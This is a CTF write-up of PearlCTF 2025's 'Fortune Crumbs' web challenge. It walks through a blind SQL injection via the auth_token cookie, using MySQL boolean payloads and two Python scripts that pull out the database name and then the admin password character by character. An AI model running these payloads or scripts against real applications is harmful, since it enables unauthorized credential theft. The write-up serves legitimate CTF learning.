# pearlctf 2025 fortune crumbs

# PearlCTF 2025 Writeup: Fortune Crumbs (Web)
**Credits:** Huge thanks to @benkyou for helping with this writeup!

**Challenge Overview:**
The "Fortune Crumbs" challenge in PearlCTF 2025 presented a web application vulnerable to blind SQL injection. Participants were tasked with exploiting this vulnerability to retrieve the admin's password.&#8203;

**Detailed Exploitation Process:**

1. **Identifying the SQL Injection Point:**
   The application’s `/request` endpoint checks the `auth_token` cookie. Fuzzing this cookie with payloads like `OR 1=1` and `OR 1=2` resulted in different server responses, indicating a potential SQL injection vulnerability.

2. **Determining the Database Management System (DBMS):**
   To tailor the injection payloads effectively, it was crucial to identify the underlying DBMS. Testing with PostgreSQL-specific payloads did not work, but MySQL-specific payloads, such as `' OR 1=IF(2=2, 1, 2)#`, executed successfully, confirming the use of MySQL.

3. **Enumerating Database Structure:**
   With MySQL confirmed as the DBMS, the next step was to enumerate the database structure:

   - **Identifying database Name:** 
    We can simply write a script to check for every letter in databse name and finally get databse name as `dont_touch`.
    ```py
    import requests
    import string
    
    url = "https://fortune-crumbs.ctf.pearlctf.in/request"
    charset = string.ascii_letters + string.digits + "_"
    database_name = ""

    for i in range(20):  # Assuming max database name length of 20
        found = False
        for char in charset:
            payload = f"' OR 1=(SELECT CASE WHEN (SELECT SUBSTR((SELECT DATABASE()), {i+1}, 1) = '{char}') THEN 2 ELSE 1 END)#"
            headers = {"Cookie": f"auth_token={payload}"}
    
            response = requests.get(url, headers=headers, allow_redirects=False)
    
            if response.status_code == 302: 
                database_name += char
                print(f"Database name so far: {database_name}")
                found = True
                break
    
        if not found:
            break  # Stop when no more characters are found
    
    print(f"Final database name: {database_name}")
    ```


   - **Identifying Table Names:**
     An educated guess suggested the presence of a `users` table. This was confirmed using the following payload:

     ```sql
     ' OR 1=IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0), 1, 5) = 'users'), 1, 2)#
     ```

   - **Identifying Column Names in the `users` Table:**
     To confirm the existence of essential columns like `username` and `password`, the following payload was used:

     ```sql
     ' OR 1=IF((SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0), 1, 8) = 'username'), 1, 2)#
     ```

     This confirmed the presence of the `username` and `password` columns.

4. **Extracting the Admin's Password:**
   With the database schema mapped out, the focus shifted to extracting the admin's password:

   - **Determining Password Length:**
     The length of the admin's password was found to be 12 characters using:

     ```sql
     ' OR 1=IF(LENGTH((SELECT password FROM users WHERE username='admin' LIMIT 1)) = 12, 1, 2)#
     ```

   - **Retrieving the Password Character by Character:**
     A Python script was employed to automate the extraction process:

     ```python
     import requests
     import string

     url = "https://fortune-crumbs.ctf.pearlctf.in/request"
     charset = string.ascii_letters + string.digits + string.punctuation
     password = ""

     for i in range(12):
         for char in charset:
             headers = {
                 "Cookie": f"auth_token=' OR 1=IF((SELECT SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1), {i+1}, 1) = '{char}'), 1, 2)#"
             }
             response = requests.get(url, headers=headers, allow_redirects=False)
             if response.status_code == 302:
                 password += char
                 print(f"password: {password}")
                 break

     print(f"final password: {password}")
     ```

     This script iteratively guessed each character of the password by observing the server's response to crafted SQL injection payloads.

5. **Retrieving the Flag:**
   Using the extracted admin credentials to log in, the flag was obtained:
` pearl{c00k13s_4r3n’t_just_f0r_34t1ng_huh?}`

